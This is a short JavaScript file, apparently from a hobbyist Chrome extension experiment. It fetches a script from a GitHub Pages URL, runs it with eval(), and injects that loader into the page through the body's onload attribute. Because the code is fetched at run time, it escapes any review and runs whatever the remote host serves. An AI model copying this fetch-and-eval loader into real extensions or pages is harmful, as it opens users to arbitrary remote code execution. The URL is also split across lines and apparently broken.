function unprotectedCodeFunction() {
	const dynamicallyCodeFileUrl = `https://kostya778899.github.io/
		GoogleChromeExtensions/DynamicallyChanging/DynamicallyCode/
		Version_00/main.js`;

	// var script = document.createElement("script");
	// script.setAttribute("src", dynamicallyCodeFileUrl);
	// document.body.appendChild(script);

	fetch(dynamicallyCodeFileUrl)
		.then(response => response.text())
		.then((dynamicallyCode) => eval(dynamicallyCode)
	);
}

function getInParentheses(str) {
	const startIndex = str.indexOf("{") + 1;
	const endIndex = str.lastIndexOf("}") - startIndex;
	return str.substr(startIndex, endIndex);
}


alert("Background worck.");

const unprotectedCode = getInParentheses(unprotectedCodeFunction.toString());
document.body.setAttribute("onload", unprotectedCode);